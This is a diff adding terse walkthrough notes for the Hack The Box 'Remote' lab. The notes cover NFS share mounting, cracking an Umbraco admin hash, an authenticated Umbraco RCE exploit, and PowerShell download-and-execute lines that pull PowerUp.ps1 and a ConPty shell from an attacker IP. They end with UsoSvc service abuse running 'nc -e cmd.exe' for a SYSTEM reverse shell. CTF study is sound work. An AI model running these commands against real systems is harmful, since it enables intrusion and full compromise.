@@ -1,0 +1,24 @@
+- nmap said 21 ftp anon login allowed (nothing there) 80 http and mountd on 2049.
+- website's contact section had a link to umbraco cms
+- ran showmount to reveal base filesystem with showmount -e remote.htb which was /site_backups
+- mounted site_backups to a folder in home called mount using sudo mount remote.htb:/site_backups ~/mount
+- went to mount and ran strings on umbraco directory that gave admin's password hash
+- cracked the hash and the password was baconandcheese.
+- logged into umbraco with username admin@htb.local and password baconandcheese
+- found cve for umbraco (its in exploit.py)
+- example python3 exploit.py -u admin@htb.local -p baconandcheese -i 'http://remote.htb' -c powershell.exe -a '-NoProfile -Command ls'
+- ran privesc check script PowerUp.ps1 using the following command.
+- python3 exploit.py -u admin@htb.local -p baconandcheese -i 'http://remote.htb' -c powershell.exe -a "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.173:8080/PowerUp.ps1'); Invoke-AllChecks"
+- It said a service could be abused for privesc
+- ServiceName   : UsoSvc
+Path          : C:\Windows\system32\svchost.exe -k netsvcs -p
+StartName     : LocalSystem
+AbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'
+CanRestart    : True
+- For reverse shell had to plant nc.exe.
+- Didnt have a good enough reverse shell to do so so used a new one called Invoke-ConPtyShell.ps1
+- SYNTAX:
+     server side - python3 exploit.py -u admin@htb.local -p baconandcheese -i 'http://remote.htb' -c powershell.exe -a "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.173:8080/Invoke-ConPtyShell.ps1'); Invoke-ConPtyShell 10.10.14.173 4444"
+     client side - stty raw -echo; (stty size; cat) | nc -lvnp 4444
+- planted nc.exe in a temp folder
+- then used python3 exploit.py -u admin@htb.local -p baconandcheese -i 'http://remote.htb' -c powershell.exe -a "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.173:8080/PowerUp.ps1'); Invoke-ServiceAbuse -Name 'UsoSvc' -Command 'nc -e cmd.exe 10.10.14.173 4444'" to get root.
